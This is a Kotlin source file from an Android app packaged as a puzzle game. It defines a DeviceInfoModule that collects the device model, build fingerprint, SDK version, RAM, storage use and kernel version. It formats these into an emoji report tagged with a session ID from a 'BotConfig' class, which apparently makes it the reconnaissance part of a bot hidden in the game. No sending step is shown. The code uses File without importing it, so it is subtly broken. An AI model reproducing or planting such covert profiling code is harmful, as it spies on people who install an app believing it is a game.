package com.puzzleblast.game.modules

import android.content.Context
import android.os.Build
import android.os.Environment
import android.os.StatFs

object DeviceInfoModule {
    suspend fun info(ctx: Context): String {
        val stat = StatFs(Environment.getDataDirectory().path)
        val totalRam = try {
            val mi = android.app.ActivityManager.MemoryInfo()
            (ctx.getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager).getMemoryInfo(mi)
            mi.totalMem / 1024 / 1024
        } catch (_: Exception) { 0L }
        val kernel = try { File("/proc/version").readText().take(80) } catch (_: Exception) { "?" }
        return """
        📟 Device Info
        🏭 ${Build.MANUFACTURER} ${Build.MODEL}
        📱 ${Build.DEVICE} / ${Build.PRODUCT}
        🔢 SDK ${Build.VERSION.SDK_INT} (Android ${Build.VERSION.RELEASE})
        🧠 RAM: ${totalRam}MB
        💾 Storage: ${(stat.totalBytes - stat.availableBytes) / 1048576}MB / ${stat.totalBytes / 1048576}MB
        🔑 Fingerprint: ${Build.FINGERPRINT.take(60)}
        🐧 Kernel: $kernel
        🆔 SID: ${com.puzzleblast.game.core.BotConfig.sid}
        """.trimIndent()
    }
}
